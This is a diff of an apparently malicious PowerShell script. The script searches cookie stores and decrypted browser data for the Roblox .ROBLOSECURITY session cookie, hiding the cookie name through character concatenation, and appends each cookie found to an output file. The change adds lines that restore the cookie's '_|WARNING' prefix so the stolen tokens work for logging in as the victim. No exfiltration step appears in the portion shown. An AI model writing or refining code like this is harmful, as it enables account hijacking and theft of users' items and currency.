@@ -95,8 +95,7 @@ foreach($p2 in $rp0){
             # Netscape format: name<TAB>value — use TAB not =
             if($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^\r\n\t]+)'){
                 $ck=$Matches[1]
-                # Extract _CAEQ part if present (short format)
-                if($ck -match '(_'+'CAEQ[^\s]+)'){$ck=$Matches[1]}
+                if($ck -notmatch '^_'+'\|WA'+'RNI'+'NG'){$ck='_'+'|WA'+'RNI'+'NG:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'+$ck}
                 Add-Content $f0 "$tR|$ck"
             }elseif($c1 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s+([^\r\n\t]+)'){
                 Add-Content $f0 "$tR|$($Matches[1])"
@@ -126,7 +125,7 @@ if(Test-Path $p3){
                 $c2=[Text.Encoding]::UTF8.GetString($d2)
                 if($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\t([^\r\n\t]+)'){
                     $ck=$Matches[1]
-                    if($ck -match '(_'+'CAEQ[^\s]+)'){$ck=$Matches[1]}
+                    if($ck -notmatch '^_'+'\|WA'+'RNI'+'NG'){$ck='_'+'|WA'+'RNI'+'NG:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'+$ck}
                     Add-Content $f0 "$tRM|$ck"
                 }elseif($c2 -match ([char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y')+'\s+([^\r\n\t]+)'){
                     Add-Content $f0 "$tRM|$($Matches[1])"
